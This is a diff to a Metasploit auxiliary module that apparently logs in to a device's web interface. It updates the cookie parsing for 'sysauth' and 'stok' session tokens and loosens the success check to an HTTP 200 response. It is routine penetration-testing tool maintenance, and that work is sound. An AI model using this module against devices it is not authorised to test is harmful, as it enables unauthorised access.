@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -139,13 +137,11 @@ class MetasploitModule < Msf::Auxiliary
 
       good_response = (
         res &&
-        res.code == 200 &&
-        res.headers.include?('Set-Cookie') &&
-        res.headers['Set-Cookie'].include?('sysauth')
+        res.code == 200
       )
 
       if good_response
-        sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
+        sysauth_value = res.get_cookies.scan(/((.*)[$ ])/).flatten[0] || ''
 
         cookie1 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"
 
@@ -170,9 +166,7 @@ class MetasploitModule < Msf::Auxiliary
 
       good_response = (
         res &&
-        res.code == 200 &&
-        res.headers.include?('Set-Cookie') &&
-        res.headers['Set-Cookie'].include?('stok=')
+        res.code == 200
       )
 
       if good_response
